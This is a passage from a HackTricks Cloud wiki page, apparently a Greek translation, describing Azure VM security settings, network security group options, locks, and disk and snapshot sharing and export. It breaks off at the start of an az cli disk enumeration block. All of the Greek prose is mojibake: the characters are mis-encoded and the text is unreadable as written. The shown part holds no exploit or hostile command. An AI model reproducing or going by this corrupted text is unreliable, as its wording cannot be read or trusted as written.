# Az - Î•Î¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ ÎœÎ·Ï‡Î±Î½Î­Ï‚ & Î”Î¯ÎºÏ„Ï…Î¿

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î”Î¹ÎºÏ„ÏÏ‰ÏƒÎ·Ï‚ Azure

Î¤Î± Î´Î¯ÎºÏ„Ï…Î± Azure Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Î¿Î½Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ ÎºÎ±Î¹ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚.** ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏƒÏÎ½Ï„Î¿Î¼ÎµÏ‚ **Ï€ÎµÏÎ¹Î³ÏÎ±Ï†Î­Ï‚,** **Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±** ÎºÎ±Î¹ **ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚** Ï„Ï‰Î½ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏÎ½ Î¿Î½Ï„Î¿Ï„Î®Ï„Ï‰Î½ Î´Î¹ÎºÏ„ÏÎ¿Ï… Azure ÏƒÏ„Î¿:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± VMs

ÎŸÎ¹ Î•Î¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ ÎœÎ·Ï‡Î±Î½Î­Ï‚ Azure (VMs) ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î­Î»Î¹ÎºÏ„Î¿Î¹, ÎºÎ±Ï„Î¬ Ï€Î±ÏÎ±Î³Î³ÎµÎ»Î¯Î± **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ cloud Ï€Î¿Ï… ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Windows Î® Linux**. Î£Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± Î±Î½Î±Ï€Ï„ÏÏƒÏƒÎµÏ„Îµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÎºÎ±Î¹ Ï†ÏŒÏÏ„Î¿Ï…Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏƒÏ„Îµ Ï†Ï…ÏƒÎ¹ÎºÏŒ Ï…Î»Î¹ÎºÏŒ. ÎŸÎ¹ Azure VMs Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¸Î¿ÏÎ½ Î¼Îµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ CPU, Î¼Î½Î®Î¼Î·Ï‚ ÎºÎ±Î¹ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± ÎºÎ±Î»ÏÏˆÎ¿Ï…Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î±Î½Î¬Î³ÎºÎµÏ‚ ÎºÎ±Î¹ Î½Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¸Î¿ÏÎ½ Î¼Îµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Azure ÏŒÏ€Ï‰Ï‚ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ¬ Î´Î¯ÎºÏ„Ï…Î±, Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎºÎ±Î¹ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.

### Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚

* **Î–ÏÎ½ÎµÏ‚ Î”Î¹Î±Î¸ÎµÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±Ï‚**: ÎŸÎ¹ Î¶ÏÎ½ÎµÏ‚ Î´Î¹Î±Î¸ÎµÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±Ï‚ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±ÎºÏÎ¹Ï„Î­Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ ÎºÎ­Î½Ï„ÏÏ‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎ½Ï„ÏŒÏ‚ Î¼Î¹Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î·Ï‚ Ï€ÎµÏÎ¹Î¿Ï‡Î®Ï‚ Azure Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï†Ï…ÏƒÎ¹ÎºÎ¬ Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î³Î¹Î± Î½Î± ÎµÎ»Î±Ï‡Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¿Î½ ÎºÎ¯Î½Î´Ï…Î½Î¿ Î½Î± ÎµÏ€Î·ÏÎµÎ±ÏƒÏ„Î¿ÏÎ½ Ï€Î¿Î»Î»Î­Ï‚ Î¶ÏÎ½ÎµÏ‚ Î±Ï€ÏŒ Ï„Î¿Ï€Î¹ÎºÎ­Ï‚ Î´Î¹Î±ÎºÎ¿Ï€Î­Ï‚ Î® ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ¿Ï†Î­Ï‚.
* **Î¤ÏÏ€Î¿Ï‚ Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚**:
* **Î¤Ï…Ï€Î¹ÎºÎ® Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±**: Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Ï‚ Ï„ÏÏ€Î¿Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Ï€Î¿Ï… Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ ÎºÎ±Î¼Î¯Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·.
* **Î•Î¼Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î¹ÎºÎ® Î•ÎºÎºÎ¯Î½Î·ÏƒÎ·**: Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï„ÏÏ€Î¿Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÎµÎ½Î¹ÏƒÏ‡ÏÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± ÎºÎ±Ï„Î¬ Ï„Ï‰Î½ boot kits ÎºÎ±Î¹ Ï„Î¿Ï… ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… Ï€Ï…ÏÎ®Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Secure Boot ÎºÎ±Î¹ Virtual Trusted Platform Module (vTPM).
* **Î•Î¼Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î¹ÎºÎ­Ï‚ VMs**: Î•ÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Î¼Î¹Î± ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î¹ÎºÎ® ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·, Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î±Ï€Î¿Î¼ÏŒÎ½Ï‰ÏƒÎ· Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î· ÏƒÎµ Ï…Î»Î¹ÎºÏŒ Î¼ÎµÏ„Î±Î¾Ï Ï„Î·Ï‚ VM, Ï„Î¿Ï… hypervisor ÎºÎ±Î¹ Ï„Î·Ï‚ Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ Ï„Î¿Ï… host, Î²ÎµÎ»Ï„Î¹ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î´Î¯ÏƒÎºÏ‰Î½ ÎºÎ±Î¹ [**Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ±**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**.**
* **Î‘Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·**: Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± Î½Î­Î¿ **ÎºÎ»ÎµÎ¹Î´Î¯ SSH**, Î±Î½ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î­Î½Î± Î´Î·Î¼ÏŒÏƒÎ¹Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î® Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î­Î½Î± Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ **azureuser**. Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¸ÎµÎ¯ Î· Ï‡ÏÎ®ÏƒÎ· **ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.**
* **ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î´Î¯ÏƒÎºÎ¿Ï… VM:** ÎŸ Î´Î¯ÏƒÎºÎ¿Ï‚ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î±Î´ÏÎ¬Î½ÎµÎ¹Î±Ï‚ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î· Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±.
* Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· **ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÏƒÏ„Î¿Î½ host**, ÏŒÏ€Î¿Ï… Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¸Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ host Ï€ÏÎ¹Î½ Î±Ï€Î¿ÏƒÏ„Î±Î»Î¿ÏÎ½ ÏƒÏ„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î±Ï€ÏŒ Î¬ÎºÏÎ¿ ÏƒÎµ Î¬ÎºÏÎ¿ Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… host ÎºÎ±Î¹ Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚ ([**docs**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data)).
* **ÎŸÎ¼Î¬Î´Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… NIC**:
* **ÎšÎ±Î¼Î¯Î±**: Î’Î±ÏƒÎ¹ÎºÎ¬ Î±Î½Î¿Î¯Î³ÎµÎ¹ ÎºÎ¬Î¸Îµ Î¸ÏÏÎ±
* **Î’Î±ÏƒÎ¹ÎºÎ®**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÎµÏÎºÎ¿Î»Î± Ï„Î¿ Î¬Î½Î¿Î¹Î³Î¼Î± Ï„Ï‰Î½ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Ï‰Î½ Î¸Ï…ÏÏÎ½ HTTP (80), HTTPS (443), SSH (22), RDP (3389)
* **Î ÏÎ¿Î·Î³Î¼Î­Î½Î·**: Î•Ï€Î¹Î»Î­Î¾Ï„Îµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚
* **Î‘Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚**: Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ **Î¤Ï…Ï€Î¹ÎºÏŒ** Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ (Î¼Î¯Î± Ï„Î·Î½ Î·Î¼Î­ÏÎ±) ÎºÎ±Î¹ **Î•Î½Î¹ÏƒÏ‡Ï…Î¼Î­Î½Î¿** (Ï€Î¿Î»Î»Î±Ï€Î»Î¬ Ï„Î·Î½ Î·Î¼Î­ÏÎ±)
* **Î•Ï€Î¹Î»Î¿Î³Î­Ï‚ Î¿ÏÏ‡Î®ÏƒÏ„ÏÎ±Ï‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ‰Î½**: Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ‰Î½ ÏƒÏ„Î¹Ï‚ VMs ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÏŒÏ€Ï‰Ï‚ Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ ÏƒÏ„Î± [**docs**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching).
* **Î•Î¹Î´Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚**: Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î»Î±Î¼Î²Î¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÎµÎ¹Î´Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Î¼Î­ÏƒÏ‰ email Î® ÎºÎ¹Î½Î·Ï„Î®Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÏŒÏ„Î±Î½ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎºÎ¬Ï„Î¹ ÏƒÏ„Î· VM. Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Î¹ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚:
* Î¤Î¿ Ï€Î¿ÏƒÎ¿ÏƒÏ„ÏŒ CPU ÎµÎ¯Î½Î±Î¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 80%
* Î¤Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î± Bytes ÎœÎ½Î®Î¼Î·Ï‚ ÎµÎ¯Î½Î±Î¹ Î»Î¹Î³ÏŒÏ„ÎµÏÎ± Î±Ï€ÏŒ 1GB
* Î¤Î¿ Ï€Î¿ÏƒÎ¿ÏƒÏ„ÏŒ ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ IOPS Î”Î¯ÏƒÎºÏ‰Î½ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎ¯Î½Î±Î¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 95%
* Î¤Î¿ Ï€Î¿ÏƒÎ¿ÏƒÏ„ÏŒ ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ IOPS OS ÎµÎ¯Î½Î±Î¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 95%
* Î¤Î¿ ÏƒÏ…Î½Î¿Î»Î¹ÎºÏŒ Î´Î¯ÎºÏ„Ï…Î¿ ÎµÎ¯Î½Î±Î¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 500GB
* Î¤Î¿ ÏƒÏ…Î½Î¿Î»Î¹ÎºÏŒ Î´Î¯ÎºÏ„Ï…Î¿ ÎµÎ¾ÏŒÎ´Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 200GB
* Î¤Î¿ VmAvailabilityMetric ÎµÎ¯Î½Î±Î¹ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 1
* **Î Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ· Ï…Î³ÎµÎ¯Î±Ï‚**: Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ HTTP ÏƒÏ„Î·Î½ Î¸ÏÏÎ± 80
* **ÎšÎ»ÎµÎ¹Î´ÏÎ¼Î±Ï„Î±**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿ ÎºÎ»ÎµÎ¯Î´Ï‰Î¼Î± Î¼Î¹Î±Ï‚ VM ÏÏƒÏ„Îµ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Î²Î±ÏƒÏ„ÎµÎ¯ Î¼ÏŒÎ½Î¿ (**ReadOnly** lock) Î® Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Î²Î±ÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏ‰Î¸ÎµÎ¯ Î±Î»Î»Î¬ ÏŒÏ‡Î¹ Î½Î± Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯ (**CanNotDelete** lock).
* ÎŸÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€ÏŒÏÎ¿Î¹ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ VM **Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÎºÎ»ÎµÎ¹Î´ÏÎ¼Î±Ï„Î±** ÏŒÏ€Ï‰Ï‚ Î´Î¯ÏƒÎºÎ¿Î¹, ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î±...
* Î¤Î± ÎºÎ»ÎµÎ¹Î´ÏÎ¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÏ†Î±ÏÎ¼Î¿ÏƒÏ„Î¿ÏÎ½ ÏƒÎµ **ÎµÏ€Î¯Ï€ÎµÎ´Î± Î¿Î¼Î¬Î´Î±Ï‚ Ï€ÏŒÏÏ‰Î½ ÎºÎ±Î¹ ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**

## Î”Î¯ÏƒÎºÎ¿Î¹ & ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î±

* Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **ÎµÏ€Î¹Ï„ÏÎ±Ï€ÎµÎ¯ Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ Î´Î¯ÏƒÎºÎ¿Ï… ÏƒÎµ 2 Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ VMs**
* Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, ÎºÎ¬Î¸Îµ Î´Î¯ÏƒÎºÎ¿Ï‚ ÎµÎ¯Î½Î±Î¹ **ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Ï‚** Î¼Îµ Î­Î½Î± ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±Ï‚.
* Î¤Î¿ Î¯Î´Î¹Î¿ Î¹ÏƒÏ‡ÏÎµÎ¹ ÎºÎ±Î¹ Î³Î¹Î± Ï„Î± ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î±
* Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î¼Î¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯ Î¿ Î´Î¯ÏƒÎºÎ¿Ï‚ Î±Ï€ÏŒ ÏŒÎ»Î± Ï„Î± Î´Î¯ÎºÏ„Ï…Î±**, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± **Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯** Î¼ÏŒÎ½Î¿ ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ **Î¹Î´Î¹Ï‰Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎµÎ¹Ï‚** Î® Î½Î± **Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎµÎ½Ï„ÎµÎ»ÏÏ‚** Î· Î´Î·Î¼ÏŒÏƒÎ¹Î± ÎºÎ±Î¹ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÎ® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·.
* Î¤Î¿ Î¯Î´Î¹Î¿ Î¹ÏƒÏ‡ÏÎµÎ¹ ÎºÎ±Î¹ Î³Î¹Î± Ï„Î± ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î±
* Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î­Î½Î± SAS URI** (Î¼Î­Î³Î¹ÏƒÏ„Î¿ 60 Î·Î¼Î­ÏÎµÏ‚) Î³Î¹Î± **ÎµÎ¾Î±Î³Ï‰Î³Î® Ï„Î¿Ï… Î´Î¯ÏƒÎºÎ¿Ï…**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¸ÎµÎ¯ ÏÏƒÏ„Îµ Î½Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î® ÏŒÏ‡Î¹
* Î¤Î¿ Î¯Î´Î¹Î¿ Î¹ÏƒÏ‡ÏÎµÎ¹ ÎºÎ±Î¹ Î³Î¹Î± Ï„Î± ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î±

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List all disks
az disk list --output table

# Get info about a disk
